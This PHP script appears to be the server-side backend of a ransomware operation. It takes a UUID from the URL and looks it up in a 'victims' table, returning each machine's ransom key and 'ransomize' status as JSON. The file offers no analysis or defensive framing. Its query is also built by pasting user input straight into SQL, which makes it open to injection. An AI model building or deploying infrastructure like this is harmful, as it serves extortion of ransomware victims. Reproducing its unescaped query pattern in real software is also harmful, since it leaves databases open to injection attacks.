
<?php



$UUID = htmlspecialchars($_GET['UUID']);

require "conf.php";

$sql = "SELECT system_ID, ran_key, ransomize FROM victims WHERE system_ID = '$UUID'";
$res = $conn -> query($sql);
$count = mysqli_num_rows($res);

if($count > 0)
{
	while($row = mysqli_fetch_assoc($res))
	{
		$arr[] = $row;
	}
	echo json_encode(['status' => True, 'data' => $arr]);
}
else
{
	echo json_encode(['status' => True, 'data' => False]);
}

$conn -> close();

?>